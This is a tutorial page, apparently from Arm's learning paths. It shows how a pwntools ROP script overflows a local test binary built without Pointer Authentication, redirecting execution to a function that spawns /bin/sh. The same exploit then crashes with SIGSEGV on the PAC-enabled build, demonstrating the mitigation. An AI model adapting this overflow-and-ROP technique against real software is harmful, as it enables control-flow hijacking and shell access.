---
# User change
title: "Exploit applications built without Pointer Authentication instructions"

weight: 3 # 1 is first, 2 is second, etc.

# Do not modify
layout: "learningpathall"
---
## Prerequisites

Install [pwntools](https://github.com/Gallopsled/pwntools) and its dependencies. We will use this exploit development library to demonstrate how you can exploit the application we built in the previous section without pointer authentication.
 
```console
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev -y
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```
## Write a python script to exploit the application

Create `exploit.py` with the following to try to exploit the application.

```console
#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='aarch64')

binary = ELF('./main_nopac')

rop = ROP(binary)

padding = b'A' * 24

rop.call(binary.symbols['func2']) # return to func2

print(rop.gadgets)
log.info("ROP chain:\n" + rop.dump())

print(rop.chain())
data = padding + rop.chain()
print(data)
data = data.replace(b'\0',b'')

print(data)
r = process(['./main_nopac', data])

r.interactive()
```
`
## Run exploit.py on main_nopac

Run the script which exploits `main_nopac`:

```console
chmod +x ./exploit.py
./exploit.py
```

Observe the output below:

```console
[*] '/home/ubuntu/pac-test/main_nopac'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 2 cached gadgets for './main_nopac'
{4194964: Gadget(0x400294, ['ret'], [], 0x8), 4257924: Gadget(0x40f884, ['ret', 'ret'], [], 0x10)}
[*] ROP chain:
    0x0000:         0x4006f8 0x4006f8()
b'\xf8\x06@\x00\x00\x00\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAA\xf8\x06@\x00\x00\x00\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAA\xf8\x06@'
[+] Starting local process './main_nopac': pid 48515
[*] Switching to interactive mode
Hello World!
$
```
You will be at an interactive shell prompt when you execute this script. You can use the interactive shell and run any commands. You were able to successfully exploit the flow control execution of the program and jump to address `0x4006f8` which maps to entry address of `func2` in `main.c`. `func2` invokes the interactive shell `/bin/sh`. With a legitimate flow of execution, `func2` would never be invoked and you would not be able to get to an interactive shell prompt.

Use `Ctrl-C` to exit the application.

## Run exploit.py on main_pac

This time we will use the same `exploit.py` script but run it on the `main_pac` application which was built has PAC support.

Replace the arguments passed with `main_pac` using `sed`. This saves a new file `exploit_pac.py`
```console
sed 's/main_nopac/main_pac/g' exploit.py > exploit_pac.py
```
Now execute `exploit_pac.py`
```console
chmod +x exploit_pac.py
./exploit_pac.py
```
This time you will not be able to use the interactive shell prompt and get a `SIGSEV` instead. The signed PAC instruction could not be authenticated, and so we were not able to exploit the application.

```console
[*] '/home/ubuntu/pac-test/main_pac'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 2 cached gadgets for './main_pac'
{4194964: Gadget(0x400294, ['ret'], [], 0x8), 4257924: Gadget(0x40f884, ['ret', 'ret'], [], 0x10)}
[*] ROP chain:
    0x0000:         0x4006fc 0x4006fc()
b'\xfc\x06@\x00\x00\x00\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAA\xfc\x06@\x00\x00\x00\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAA\xfc\x06@'
[+] Starting local process './main_pac': pid 48554
[*] Switching to interactive mode
Hello World!
[*] Got EOF while reading in interactive
$
[*] Process './main_pac' stopped with exit code -11 (SIGSEGV) (pid 48554)
[*] Got EOF while sending in interactive
```
This example demonstrates how Pointer Authentication provides some protection against attacks.
